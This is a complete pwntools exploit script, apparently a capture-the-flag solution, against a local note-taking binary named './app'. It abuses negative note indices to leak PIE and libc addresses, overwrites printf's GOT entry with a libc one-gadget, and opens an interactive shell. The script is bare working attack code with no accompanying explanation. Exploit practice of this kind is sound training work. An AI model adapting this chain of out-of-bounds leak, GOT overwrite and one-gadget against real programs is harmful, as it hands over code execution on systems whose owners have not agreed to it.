#!/usr/bin/env python3
from pwn import *
from datetime import datetime, timezone

exe = context.binary = ELF(args.EXE or './app')
libc = ELF(exe.libc.path)


def recover_addr(date, note):
    epoch32 = int(datetime.strptime(date.decode(), "%d/%m/%Y %I:%M:%S %p")
                  .replace(tzinfo=timezone.utc).timestamp()) & 0xffffffff
    note_val = int.from_bytes(note, "little")
    return (note_val << 32) | epoch32
    
def leak_addr(idx):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"view > ", str(idx).encode())
    io.recvuntil(b" on ")
    date = io.recvline().strip()
    io.recvuntil(b': "')
    note = io.recvline().strip()
    return recover_addr(date, note)

def edit_note(idx, content):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"edit > ", str(idx).encode())
    io.sendlineafter(b"content: ", content)

def add_note(content):
    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"content > ", content)

io = process('./app')

pieBase = leak_addr(-210) - 0x4050

add_note(b"A"*4 + p64(pieBase + exe.got['setbuf']))
libcBase = leak_addr(-199) - libc.symbols['setbuf']

io.sendlineafter(b"> ", b"3\n0")
add_note(b"A"*4 + p64(pieBase + exe.got['printf'] - 4))

one_shot = libcBase + 0xebd3f
edit_note(-199, p64(one_shot))

io.interactive()
